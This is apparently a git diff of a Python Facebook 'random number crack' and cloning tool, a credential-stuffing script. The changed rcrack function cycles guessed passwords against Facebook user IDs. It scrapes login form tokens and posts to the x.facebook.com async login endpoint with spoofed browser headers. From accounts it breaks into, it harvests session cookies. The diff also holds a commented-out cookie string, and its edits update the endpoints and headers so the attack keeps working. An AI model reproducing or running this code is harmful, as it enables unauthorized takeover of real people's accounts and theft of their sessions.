@@ -14,7 +14,7 @@ logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m    
 def NASRAT():
     os.system('clear')
     print(logo)
-    print(' [1] First Follow MY FB ID')
+    print(' [1] First FOLLOW MY ID')
     print(' [2] EXIT')
     opt = input('\n   Choose option >>> ')
     if opt == '1':
@@ -42,7 +42,7 @@ def o():
     print(logo)
     print('\t RANDOM NUMBER CRACK')
     print('')
-    print('\x1b[1;32m [1]\x1b[1;33m RANDOM CLONING ')
+    print('\x1b[1;32m [1]\x1b[1;33m RANDOM COLONING ')
     print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
     print(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
     print(' \x1b[1;32m[4] \x1b[1;32m Follow My FB ID')
@@ -160,11 +160,10 @@ $$$$\ $$ |$$ /  $$ |$$ /  \__|$$ |  $$ |$$ /  $$ |  $$ |
 $$ $$\$$ |$$$$$$$$ |\$$$$$$\  $$$$$$$  |$$$$$$$$ |  $$ |   
 $$ \$$$$ |$$  __$$ | \____$$\ $$  __$$< $$  __$$ |  $$ |   
 $$ |\$$$ |$$ |  $$ |$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |   
-$$ | \$$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ |   
+$$ | \$$ |$$ |  $$ |\$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | AFG  
 \__|  \__|\__|  \__| \______/ \__|  \__|\__|  \__|  \__|                                           
-
 \033[1;37m==============================================
-\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m NASRAT\33[0;m\033[1;32m && \033[1;33mMOSHTAQ\33[0;m
+\033[1;32m     \033[1;33mWONER\33[0;m   :  \033[1;33m NASRAT\33[0;m\033[1;32m & \033[1;33mMOSHTAQ\33[0;m
 \033[1;32m     \033[1;32mFACEBOK      : \033[1;34m LOY RAYESS KABUL
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mNasrat99845.git
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m FREE
@@ -401,7 +400,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -413,28 +412,33 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = { 
-    'authority': 'mbasic.facebook.com',
+    'authority': 'x.facebook.com',
     'method': 'POST',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7',
-    'cache-control': 'max-age=0',
-    'dpr': '3',
-    'sec-ch-prefers-color-scheme': 'dark',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
+    'dpr': '2.625',
+    'origin': 'https://x.facebook.com',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5765.210", "Google Chrome";v="114.0.5765.210"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO CH7n"',
-    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '"SM-G975U"',
+    'sec-ch-ua-platform': '"macOS"',
     'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
     'user-agent': pro,
-    'viewport-width': '980',}
+    'viewport-width': '412',
+    'x-asbd-id': '129477',
+    'x-fb-lsd': 'AVrqBrF5Idc',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',}
 
-            lo = session.post('https://mbasic.facebook.com/',data=log_data,headers=header_freefb).text,
+            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -454,7 +458,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[NASRAT_OK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[NASRATOK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
